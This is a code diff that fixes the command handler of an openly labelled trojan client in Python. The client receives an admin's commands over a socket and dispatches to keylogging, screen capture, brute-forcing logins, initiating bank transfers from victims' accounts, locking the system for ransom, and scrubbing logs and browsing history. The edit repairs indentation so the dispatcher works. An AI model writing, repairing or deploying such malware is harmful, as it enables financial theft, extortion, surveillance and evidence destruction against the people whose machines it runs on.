@@ -216,7 +216,6 @@ class TrojanClient:
                 self.sock.send(message.encode())
             except Exception:
                 self.connected = False        
- 
 def listen_for_commands(self):
         """Receives commands from the admin."""
         while self.connected:
@@ -227,41 +226,35 @@ def listen_for_commands(self):
                 self.process_command(data)
             except Exception as e:
                 print(f"[CLIENT] Error: {e}")
-                break            
- def process_command(self, command: str):
-     """Interprets commands from Admin."""
-     cmd_type = command.split(':')[0]
- 
- if cmd_type == "KEYLOG":
-     GadgetAccess().capture_keylog()
-     self.send_response(f"KEYLOG:{GadgetAccess().keylogs[-1]}")
- 
- elif cmd_type == "SCREEN":
-     GadgetAccess().capture_screen()
-     self.send_response("SCREEN:CAPTURED")
- 
- elif cmd_type == "BRUTE":
-     # Example: BRUTE:https://admin.com:passwords.txt
-     targets = command.split(':')[1].split('|')
-     for t in targets:
-         BruteForceEngine().attack(t.split(':')[0], t.split(':')[1])
- 
- elif cmd_type == "TRANSFER":
-     # Example: TRANSFER:victim_id:target_acc:amount
-     parts = command.split(':')[1].split('|')
-     for p in parts:
-         t_id, t_acc, amt = p.split(',')
-         BankingInterceptor().initiate_transfer(t_id, t_acc, amt)
- 
- elif cmd_type == "LOCK":
-     # Locks files or system
-     print("[SYSTEM] Locking system for ransom demand.")
-     self.send_response("LOCK:SYSTEM_LOCKED")
- 
- elif cmd_type == "DELETE":
-     DeletionSystem().scrub_logs()
-     DeletionSystem().clear_browsing_history()
-     self.send_response("DELETE:CLEARED")
+                break
+
+    def process_command(self, command: str):
+        """Interprets commands from Admin."""
+        cmd_type = command.split(':')[0]
+        if cmd_type == "KEYLOG":
+            GadgetAccess().capture_keylog()
+            self.send_response(f"KEYLOG:{GadgetAccess().keylogs[-1]}")
+        elif cmd_type == "SCREEN":
+            GadgetAccess().capture_screen()
+            self.send_response("SCREEN:CAPTURED")
+        elif cmd_type == "BRUTE":
+            targets = command.split(':')[1].split('|')
+            for t in targets:
+                BruteForceEngine().attack(t.split(':')[0], t.split(':')[1])
+        elif cmd_type == "TRANSFER":
+            parts = command.split(':')[1].split('|')
+            for p in parts:
+                t_id, t_acc, amt = p.split(',')
+                BankingInterceptor().initiate_transfer(t_id, t_acc, amt)
+        elif cmd_type == "LOCK":
+            print("[SYSTEM] Locking system for ransom demand.")
+            self.send_response("LOCK:SYSTEM_LOCKED")
+        elif cmd_type == "DELETE":
+            DeletionSystem().scrub_logs()
+            DeletionSystem().clear_browsing_history()
+            self.send_response("DELETE:CLEARED") 
+
+   
 
  def send_response(self, message: str):
      """Sends data back to Admin."""
